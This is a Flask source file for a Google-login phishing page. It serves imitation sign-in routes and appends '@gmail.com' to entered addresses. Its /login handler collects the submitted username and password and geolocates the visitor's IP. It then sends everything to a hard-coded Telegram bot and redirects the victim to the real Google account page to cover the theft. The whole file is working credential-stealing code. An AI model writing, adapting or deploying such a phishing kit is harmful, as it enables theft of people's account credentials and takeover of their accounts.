from flask import Flask, render_template, request, redirect
from flask_basicauth import BasicAuth
import requests

app = Flask(__name__)
app.static_folder = 'static'
app.static_url_path = '/static'

app.config['BASIC_AUTH_USERNAME'] = 'demo'
app.config['BASIC_AUTH_PASSWORD'] = 'demo'

basic_auth = BasicAuth(app)

@app.route('/v3/signin/identifier')
@basic_auth.required
def index():
    return render_template('index.html')


@app.route('/v3/signin/identifier/password')
@basic_auth.required
def passwd():
    
    user = request.args.get('email')
    if not user.endswith('@gmail.com'):
        user = user + "@gmail.com"
    print(user)
    return render_template('passwd.html', user=user)
        
@app.route('/login')
@basic_auth.required
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    ip = request.remote_addr
    # IP-Daten von ip-api.com abrufen
    response = requests.get(f"http://ip-api.com/json/{ip}")
    ip_data = response.json()
    # Nachricht an Telegram senden
    message = f"Login-Informationen:\nBenutzername: {username}\nPasswort: {password}\nIP-Data: {ip_data}"
    requests.get(f"https://api.telegram.org/bot5751384094:AAGiPu72GJlp4JziOkQvnpMtIH2EZsF1JmQ/sendMessage?chat_id=608885714&disable_web_page_preview=true&disable_web_page_preview=true&text={message}")

    return redirect("https://myaccount.google.com/")




if __name__ == '__main__':
    app.run()
